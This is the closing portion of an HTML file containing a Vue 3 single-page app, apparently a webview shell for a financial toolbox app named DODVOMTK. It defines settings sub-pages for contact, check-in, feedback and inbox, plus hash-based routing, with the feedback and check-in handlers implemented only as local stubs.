            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">About Team</div><div style="width:40px;"></div></div><div class="container"><div class="card"><p>Our engineering team specializes in high-performance cross-platform mobile webview architectures, dedicated to providing lightning-fast financial tools.</p></div></div></div>`
        };

        const ContactSubView = {
            setup() {
                window.location.href = 'mailto:sdawgw.fdsgrae.ragew@gmail.com';
            },
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">Contact Us</div><div style="width:40px;"></div></div><div class="container"><div class="card"><p>Opening your local mail client to contact sdawgw.fdsgrae.ragew@gmail.com...</p></div></div></div>`
        };

        const CheckinSubView = {
            template: `
                <div>
                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">Monthly Check-in</div><div style="width:40px;"></div></div>
                    <div class="container">
                        <div class="card" style="text-align: center;">
                            <h3 style="margin-bottom: 12px;">Daily Attendance</h3>
                            <button class="btn" @click="doCheckin" :disabled="checked"> {{ checked ? 'Checked In Today' : 'Check In Now' }} </button>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const checked = ref(localStorage.getItem('checked_in') === 'true');
                const doCheckin = () => {
                    localStorage.setItem('checked_in', 'true');
                    checked.value = true;
                    alert('Check-in successful!');
                };
                return { checked, doCheckin };
            }
        };

        const FeedbackSubView = {
            template: `
                <div>
                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">Customer Feedback</div><div style="width:40px;"></div></div>
                    <div class="container">
                        <div class="card">
                            <label>Title</label>
                            <input type="text" v-model="title" placeholder="Feedback title..." />
                            <label>Content</label>
                            <textarea v-model="content" rows="4" placeholder="Describe your issue or suggestion..."></textarea>
                            <button class="btn" :disabled="!isValid" @click="submit">Send Feedback</button>
                        </div>
                    </div>
                    <div v-if="showToast" class="toast">Feedback sent successfully!</div>
                </div>
            `,
            setup() {
                const title = ref('');
                const content = ref('');
                const showToast = ref(false);
                const router = useRouter();

                const isValid = computed(() => title.value.trim() && content.value.trim());

                const submit = () => {
                    showToast.value = true;
                    setTimeout(() => {
                        showToast.value = false;
                        router.back();
                    }, 1200);
                };

                return { title, content, isValid, submit, showToast };
            }
        };

        const InboxSubView = {
            template: `
                <div>
                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">Inbox</div><div style="width:40px;"></div></div>
                    <div class="container">
                        <div class="card" @click="showAlert = true" style="cursor: pointer;">
                            <div style="font-weight: 700;">Welcome to DODVOMTK</div>
                            <div style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">Tap to read message details</div>
                        </div>
                        <div v-if="showAlert" @click="showAlert = false" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:200;">
                            <div class="card" style="width: 80%; background: #fff;" @click.stop>
                                <h3>Welcome</h3>
                                <p style="margin: 10px 0; color: var(--text-secondary);">Thank you for installing DODVOMTK. Explore our advanced financial toolbox and real-time market data modules today!</p>
                                <button class="btn" @click="showAlert = false">Close</button>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const showAlert = ref(false);
                return { showAlert };
            }
        };

        // Router Configuration
        const routes = [
            { path: '/', component: LoadingView },
            { path: '/home', component: HomeView },
            { path: '/subpage', component: SubPageView },
            { path: '/detail', component: DetailView },
            { path: '/toolbox', component: ToolboxView },
            { path: '/settings', component: SettingsView },
            { path: '/settings/version', component: VersionSubView },
            { path: '/settings/privacy', component: PrivacySubView },
            { path: '/settings/terms', component: TermsSubView },
            { path: '/settings/team', component: TeamSubView },
            { path: '/settings/contact', component: ContactSubView },
            { path: '/settings/checkin', component: CheckinSubView },
            { path: '/settings/feedback', component: FeedbackSubView },
            { path: '/settings/inbox', component: InboxSubView }
        ];

        const router = createRouter({
            history: createWebHashHistory(),
            routes
        });

        // Main Vue Instance
        const App = {
            setup() {
                const route = useRoute();
                const showTabBar = computed(() => {
                    const path = route.path;
                    return path === '/home' || path === '/toolbox' || path === '/settings';
                });
                return { showTabBar };
            }
        };

        const app = createApp(App);
        app.use(router);
        app.mount('#app');
    </script>
</body>
</html>
